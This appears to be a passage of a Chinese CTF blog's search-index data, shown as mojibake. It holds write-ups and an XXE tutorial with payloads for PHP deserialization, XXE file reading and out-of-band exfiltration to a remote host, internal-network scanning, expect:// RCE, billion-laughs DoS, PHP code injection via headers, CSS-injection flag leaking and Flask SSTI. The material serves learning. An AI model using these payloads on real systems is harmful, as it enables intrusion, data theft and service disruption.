&quot;1&quot;; &#125;&#125;$first &#x3D; new bb();$second &#x3D; new aa();$third &#x3D; new cc();$four &#x3D; new ee();$first-&gt;mod1 &#x3D; $second;$third-&gt;mod1 &#x3D; $four;$f &#x3D; new dd();$f-&gt;flag &#x3D; &#39;Get_flag&#39;;$f-&gt;b &#x3D; &#39;call_user_func&#39;;$four-&gt;str1 &#x3D; $f;$four-&gt;str2 &#x3D; &quot;getflag&quot;;$second-&gt;mod2[&#39;test2&#39;] &#x3D; $third;&#x2F;&#x2F;var_dump($first);echo serialize($first); ç›®çš„æ˜¯è§¦å‘get_flagæ–¹æ³• 1bb-&gt;__destruct()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;aa-&gt;__call()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;cc-&gt;__invoke()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;ee-&gt;__toString()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;dd-&gt;getflag() popé“¾å¯ä»¥ç”¨åå‘åˆ†æçš„æ–¹æ³•å¾—åˆ°ã€‚ è§¦å‘sessionååºåˆ—åŒ–å¾—åˆ°Soapå¯¹è±¡çˆ¬å–åˆ°çš„flag,ç„¶åè¾“å‡º å‘é€ç»™se.phpå³å¯å¾—åˆ°flag å­¦ä¹ ä¸€ä¸‹session.upload_progressphp&gt;5.4æ—¶,php.iniæœ‰å¦‚ä¸‹é»˜è®¤é…ç½® 123456session.upload_progress.enabled &#x3D; onsession.upload_progress.cleanup &#x3D; onsession.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.upload_progress.freq &#x3D; &quot;1%&quot;session.upload_progress.min_freq &#x3D; &quot;1&quot; enabled=onè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼› cleanup=onè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼› cleanup=onæ—¶è€ƒè™‘æ¡ä»¶ç«äº‰è¿›è¡Œåˆ©ç”¨ nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼› prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å ReferenceSWPU2019-Webé¢˜è§£ åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€ ç¬¬åå±ŠSWPUCTFwriteup PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://yanmymickey.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"[INSâ€™hAck 2019]Atchap","date":"2020-04-17T16:00:00.000Z","path":"2020/04/18/CTF_WP/[INS'hAck 2019]Atchap/","text":"[INSâ€™hAck 2019]Atchapåˆ†æåˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¼æ´ Tchap: The super (not) secure app of the French government payloadbuuæ³¨å†Œä¸€ä¸ªé‚®ç®± å‘é€è‡ªå·±çš„é‚®ç®±,æç¤º 1You&#39;re not whitelisted or not part of the company.. å‘é€ä¸‹é¢contact usçš„é‚®ç®±Samira.Bien@almosttchap.fr 1You&#39;re not using your official address.. å‘é€ 1yourmail@mail.com@Samira.Bien@almosttchap.fr åœ¨é‚®ç®±ä¸­æŸ¥çœ‹é‚®ä»¶ä¸­å¾—åˆ°flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"é‚®ä»¶æœåŠ¡å™¨æ¼æ´","slug":"é‚®ä»¶æœåŠ¡å™¨æ¼æ´","permalink":"https://yanmymickey.github.io/tags/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/"}]},{"title":"XXE","date":"2020-04-16T16:00:00.000Z","path":"2020/04/17/CTF/XXE/","text":"XXE0x01ä»€ä¹ˆæ˜¯XXEXXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥,ä¸ä»…èƒ½å¤Ÿæ³¨å…¥XMLä»£ç ,è¿˜èƒ½æ³¨å…¥XMLå¤–éƒ¨å®ä½“ å¦‚æœèƒ½æ³¨å…¥ å¤–éƒ¨å®ä½“å¹¶ä¸”æˆåŠŸè§£æçš„è¯ï¼Œè¿™å°±ä¼šå¤§å¤§æ‹“å®½æˆ‘ä»¬ XML æ³¨å…¥çš„æ”»å‡»é¢. 0x02åŸºç¡€è¯­æ³•XMLåŸºç¡€è¯­æ³• XMLä¸DTD DTDæ•™ç¨‹ 0x03å¤–éƒ¨å®ä½“é‡ç‚¹ä¸€ï¼š å®ä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“,å®ä½“å¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç ï¼š ç¤ºä¾‹ä»£ç ï¼š 12345678&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; &lt;pass&gt;mypass&lt;&#x2F;pass&gt;&lt;&#x2F;creds&gt; è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°,éå¸¸æ–¹ä¾¿ï¼ˆæ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäººï¼‰ å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ å¼•ç”¨å…¬ç”¨ DTD çš„æ–¹æ³•ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š 1&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt; è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨ é‡ç‚¹äºŒï¼š æˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®ä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å¤–éƒ¨ï¼‰ï¼Œä½†æ˜¯å®é™…ä¸Šä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“ä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼ˆé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ï¼‰ 1.é€šç”¨å®ä½“ ç”¨ &amp;å®ä½“å; å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨ ç¤ºä¾‹ä»£ç ï¼š 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt; &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt; &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt; ... &lt;&#x2F;updateProfile&gt; 2.å‚æ•°å®ä½“ï¼š (1)ä½¿ç”¨ % å®ä½“å(è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ %å®ä½“å; å¼•ç”¨(2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“(3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ ç¤ºä¾‹ä»£ç ï¼š 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; %an-element; %remote-dtd; æŠ›è½¬ï¼š å‚æ•°å®ä½“åœ¨æˆ‘ä»¬ Blind XXE ä¸­èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ 0x04åˆ©ç”¨1ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)ç¤ºä¾‹ä»£ç ï¼š xml.php 12345678910&lt;?php libxml_disable_entity_loader (false); $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); echo $creds;?&gt; payload: 1234&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt; 2ã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)xml.php 1234567&lt;?phplibxml_disable_entity_loader (false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt; payloadï¼š 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;%remote;%int;%send;]&gt; æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ï¼š æˆ‘ä»¬ä» payload ä¸­èƒ½çœ‹åˆ° è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ %remote;%int;%send;ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ test.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå°† test.dtd åŒ…å«è¿›æ¥ï¼Œç„¶å %int è°ƒç”¨ test.dtd ä¸­çš„ %file, %file å°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ° %send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  %)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹ vps ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œå®Œç¾çš„è§£å†³äº† XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚ 3ã€HTTP å†…ç½‘ä¸»æœºæ¢æµ‹æˆ‘ä»¬ä»¥å­˜åœ¨ XXE æ¼æ´çš„æœåŠ¡å™¨ä¸ºæˆ‘ä»¬æ¢æµ‹å†…ç½‘çš„æ”¯ç‚¹ã€‚è¦è¿›è¡Œå†…ç½‘æ¢æµ‹æˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ file åè®®è¯»å–æˆ‘ä»¬ä½œä¸ºæ”¯ç‚¹æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å†…ç½‘ï¼Œä»¥åŠç½‘æ®µå¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ï¼ˆæˆ‘ä»¥linux ä¸ºä¾‹ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å– /etc/network/interfaces æˆ–è€… /proc/net/arp æˆ–è€… /etc/host æ–‡ä»¶ä»¥åæˆ‘ä»¬å°±æœ‰äº†å¤§è‡´çš„æ¢æµ‹æ–¹å‘äº† æ¢æµ‹è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;# &lt;stuff&gt;user&lt;&#x2F;stuff&gt;#&lt;&#x2F;xml&gt;def build_xml(string): xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot; send_xml(xml)def send_xml(xml): url&#x3D;&quot;å­˜åœ¨xxeçš„urlåœ°å€&quot; headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125; x &#x3D; requests.post(url, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value print coded_string# print base64.b64decode(coded_string)for i in range(1, 255): try: i &#x3D; str(i) ip &#x3D; &#39;10.0.0.&#39; + i string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39; print string build_xml(string) except:continue 4ã€HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æpayload 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [ &lt;!ELEMENT data (#PCDATA)&gt; ]&gt;&lt;data&gt;4&lt;&#x2F;data&gt; 5ã€å†…ç½‘ç›²æ³¨(CTF)2018 å¼ºç½‘æ¯ Wechat 2018 å¼ºç½‘æ¯ WP 6ã€æ–‡ä»¶ä¸Šä¼ Java jar://åè®®ç›¸å…³ï¼Œè‡ªè¡ŒæŸ¥çœ‹Reference 7ã€é’“é±¼ï¼šåˆ©ç”¨ftpåè®®ç»“åˆCRLFæ³¨å…¥å‘SMTPæœåŠ¡å™¨å‘é€ä»»æ„å‘½ä»¤è¾¾åˆ°å‘é€ä»»æ„é‚®ä»¶çš„ç»™ä»»æ„äººï¼Œè¯¦æƒ…æŸ¥çœ‹Reference 8ã€å…¶ä»–1.PHP expect RCEç”±äº PHP çš„ expect å¹¶ä¸æ˜¯é»˜è®¤å®‰è£…æ‰©å±•ï¼Œå¦‚æœå®‰è£…äº†è¿™ä¸ªexpect æ‰©å±•æˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨ XXE è¿›è¡Œ RCE ç¤ºä¾‹ä»£ç ï¼š 1234&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;&lt;&#x2F;dir&gt; 2. åˆ©ç”¨ XXE è¿›è¡Œ DOS æ”»å‡»ç¤ºä¾‹ä»£ç ï¼š 12345678910111213&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt; 0x05æ€»ç»“XXEåœ¨ctfæ¯”èµ›ä¸­ä¹Ÿç®—æ¯”è¾ƒå¸¸è§ï¼Œæœ€è¿‘åšé¢˜ç¢°åˆ°å¾ˆå¤šçš„xxeçš„é¢˜ç›®ï¼Œå¤§å¤šé¢˜ç›®éš¾åº¦æ¯”è¾ƒé€‚ä¸­ï¼Œè®°å½•ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹ 0x06Referenceä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"XXE","slug":"XXE","permalink":"https://yanmymickey.github.io/tags/XXE/"}]},{"title":"Phuck2","date":"2020-04-16T16:00:00.000Z","path":"2020/04/17/CTF_WP/Phuck2/","text":"Phuck2åˆ†ææŸ¥çœ‹wpçš„æºä»£ç çš„å‘ç°ä¼ å…¥å‚æ•°hlå¯ä»¥å¾—åˆ°æºç  123456789101112131415161718192021222324252627 &lt;?php stream_wrapper_unregister(&#39;php&#39;); if(isset($_GET[&#39;hl&#39;])) highlight_file(__FILE__); $mkdir &#x3D; function($dir) &#123; system(&#39;mkdir -- &#39;.escapeshellarg($dir)); &#125;; $randFolder &#x3D; bin2hex(random_bytes(16)); $mkdir(&#39;users&#x2F;&#39;.$randFolder); chdir(&#39;users&#x2F;&#39;.$randFolder); $userFolder &#x3D; (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] : $_SERVER[&#39;REMOTE_ADDR&#39;]); $userFolder &#x3D; basename(str_replace([&#39;.&#39;,&#39;-&#39;],[&#39;&#39;,&#39;&#39;],$userFolder)); $mkdir($userFolder); chdir($userFolder); file_put_contents(&#39;profile&#39;,print_r($_SERVER,true)); chdir(&#39;..&#39;); $_GET[&#39;page&#39;]&#x3D;str_replace(&#39;.&#39;,&#39;&#39;,$_GET[&#39;page&#39;]); if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123; include($_GET[&#39;page&#39;]); &#125; chdir(__DIR__); system(&#39;rm -rf users&#x2F;&#39;.$randFolder);?&gt; $userFolderåœ¨æœ‰X-FORWARDED-FORå¤´æ˜¯ç”¨è¿™ä¸ªä½œä¸ºæ–‡ä»¶å¤¹å ä¼šæ‰“å°$_SERVERä¼ å…¥profileæ–‡ä»¶ 123if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123; include($_GET[&#39;page&#39;]); &#125; è€ƒè™‘åœ¨httpè¯·æ±‚å¤´ä¸­æ’å…¥phpä»£ç ,ç„¶ååŒ…å«profileæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ å½“allow_url_include=Offæ—¶ file_get_contentsåœ¨å¤„ç†data:xxxæ—¶ä¼šç›´æ¥å–xxx è€Œincludeä¼šåŒ…å«æ–‡ä»¶åä¸ºdata:xxxçš„æ–‡ä»¶ payload123456GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1X-Forwarded-For: data:aaUser-Agent: &lt;?php system(&#39;ls &#x2F;&#39;); ?&gt;GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1X-Forwarded-For: data:aaUser-Agent: &lt;?php system(&#39;&#x2F;get_flag&#39;);?&gt; åœ¨è¿”å›çš„æ•°æ®ä¸­æ‰¾åˆ°flag 1[HTTP_USER_AGENT] &#x3D;&gt; flag&#123;asdsafasfdsadasd&#125; ReferencePhuck2wp","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"phpä¼ªåè®®","slug":"phpä¼ªåè®®","permalink":"https://yanmymickey.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"dataåè®®ä¸file_get_contentsä¸include","slug":"dataåè®®ä¸file-get-contentsä¸include","permalink":"https://yanmymickey.github.io/tags/data%E5%8D%8F%E8%AE%AE%E4%B8%8Efile-get-contents%E4%B8%8Einclude/"}]},{"title":"[å®‰æ´µæ¯ 2019]cssgame","date":"2020-04-16T16:00:00.000Z","path":"2020/04/17/CTF_WP/[å®‰æ´µæ¯ 2019]cssgame/","text":"[å®‰æ´µæ¯ 2019]cssgameåˆ†æå¾ˆæœ‰æ„æ€çš„CSS injection å¤§è‡´çš„æ€è·¯å°±æ˜¯é€šè¿‡ä¼ å…¥ä¸€ä¸ªå¤–éƒ¨é“¾æ¥çš„css,è®©flag.htmlè§£æ, å¤–éƒ¨é“¾æ¥çš„csså†™å…¥å¦‚ä¸‹å†…å®¹ 1input[name&#x3D;flag][value^&#x3D;&quot;f&quot;] ~ * &#123;background-image: url(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;?flag&#x3D;f&quot;);&#125; ç„¶åå¯¹flagå€¼è¿›è¡Œé€ä½åˆ¤æ–­ï¼Œå¦‚æœæ­£ç¡®åˆ™å‘é€æ•°æ®ç»™vps payloadexp 123456789import sysf &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;for i in dic: flag &#x3D; sys.argv[1] + i payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\\&quot;&quot; + flag + &quot;\\&quot;] ~ * &#123;background-image: url(\\&quot;http:&#x2F;&#x2F;174.0.31.242:8080&#x2F;?&quot; + flag + &quot;\\&quot;);&#125;&quot; f.write(payload + &quot;\\n&quot;)f.close() åœ¨buuç”³è¯·ä¸€å°å°å·linux lab,ç„¶ååœ¨/var/www/html/ç›®å½•å†™å…¥ä»¥ä¸Šexp,è¿è¡Œä¸€ä¸‹è„šæœ¬,ncå¼€å¯ç›‘å¬ ç„¶åå°±å¼€å§‹å°†css=http://174.0.31.242/poc.csspostç»™crawl.html,åœ¨ncç›‘å¬ä¸­å¯ä»¥å¾—åˆ°flag,ç„¶åæ‰‹åŠ¨æ”¹flagçš„å€¼,ç”Ÿæˆä¸åŒçš„poc.css,é€ä½çˆ†ç ´å¯ä»¥å¾—åˆ°flag æ€»ç»“ä»¥ä¸Šæ–¹æ³•è¿˜æ˜¯æœ‰ç‚¹éº»çƒ¦çš„ï¼Œçœ‹çœ‹å®˜æ–¹wpï¼Œå‘ç°æœ‰æ›´å¥½çš„åŠæ³•ï¼Œå­¦ä¸€æ‰‹ï¼ŒINS Reference[å®‰æ´µæ¯ 2019]cssgame wp [å®‰æ´µæ¯ 2019]cssgame å®˜æ–¹WP","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"CSS injection","slug":"CSS-injection","permalink":"https://yanmymickey.github.io/tags/CSS-injection/"}]},{"title":"[CSCCTF 2019 Qual]FlaskLight","date":"2020-04-14T16:00:00.000Z","path":"2020/04/15/CTF_WP/[CSCCTF 2019 Qual]FlaskLight/","text":"[CSCCTF 2019 Qual]FlaskLightåˆ†æé¢˜ç›®æ˜¯flaskï¼Œæ‰“å¼€æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æç¤ºä¼ å‚searchï¼Œfuzzæµ‹è¯• 123&#123;&#123;1*2&#125;&#125;#è¿”å›ç»“æœ2å¯ä»¥åˆ¤å®šæœ‰SSTIæŸ¥çœ‹&#123;&#123;config&#125;&#125;å‘ç°ä¸€äº›ä¿¡æ¯ ç„¶åå°±æ˜¯å¸¸è§„çš„æ¨¡æ¿æ³¨å…¥ [Templates Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection) 12&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;#å¯ä»¥çˆ†å‡ºæ‰€æœ‰çš„ç±» å†™äº†ä¸€ä¸ªè„šæœ¬æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±» åˆ©ç”¨subprocess.Popenæ‰§è¡Œå‘½ä»¤,è¯¦æƒ…å‚è€ƒé“¾æ¥ 12345678910111213141516171819202122import requestsimport reimport htmlimport timeindex &#x3D; 0for i in range(170, 1000): try: url &#x3D; &quot;http:&#x2F;&#x2F;5a8d97da-4cb0-43f8-9810-e9c352e034ad.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot; r &#x3D; requests.get(url) res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\\&#x2F;h2&gt;\\W+&lt;h3&gt;(.*)&lt;\\&#x2F;h3&gt;&quot;, r.text) time.sleep(0.1) # print(res) # 